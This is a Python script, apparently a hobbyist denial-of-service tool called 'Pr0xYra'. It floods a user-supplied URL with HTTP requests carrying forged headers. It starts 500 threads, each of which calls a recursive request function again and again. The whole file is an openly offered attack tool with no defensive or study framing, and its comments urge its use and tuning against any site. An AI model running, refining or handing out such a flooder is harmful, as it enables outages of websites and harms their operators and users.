import urllib.request # Sending requests
import random         # For generating random keep-alive time
import threading      # For multi threading
import sys            # sys.argv


print("============================")
print("==========Pr0xYra===========")
print("=====DDOS TOOL BY Pr0xY=====")
print("===github.com/voidcode1337==")
print("===Based on STOXCQIUE code==")
print("===For Saphyra DDOS tool====")
print("============================")


def usage():
    print("usage: python3 script.py http://url.com/")
    exit(1)


if len(sys.argv) == 2:
    url = sys.argv[1]
    host = sys.argv[1][7:-1]

    if url[-1] != '/':
        url += "/"
    if url[:7] != 'http://':
        usage()
else:
    usage()


def ddos(req, counter=0):  # send request to site
    try:
        urllib.request.urlopen(request)
    except Exception as err:
        print('Error', err)  # if its unable to send req, print err code
    finally:
        ddos(req, counter+1) # recursion, call it again and again and again



user_agent = "Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0" # You can set any user_agent you want
referer = "http://www.google.ba/search?q=Pr0xYra" # You can set any referal you want

# Forge request to be sent to target url

request = urllib.request.Request(url)
request.add_header('User-Agent', user_agent)
request.add_header('Cache-Control', 'no-cache')
request.add_header("Referer", referer)
request.add_header('Connection', 'keep-alive')
request.add_header("Keep-Alive", random.randint(100, 150))
request.add_header("Host", host)


def run(): # function to handle every thread and call ddos function
    while True:
        try:
            ddos(request)
        except Exception as err:
            print("---> KARANJE HAS BEGUN <---")

# create all threads and start attack
# you can changr number below for more or less if you want
# for me this is enough
# minimal upload speed should be 1MB/s(8Mb/s) for normal functioning
for i in range(500): 
    t = threading.Thread(target=run)
    t.start()


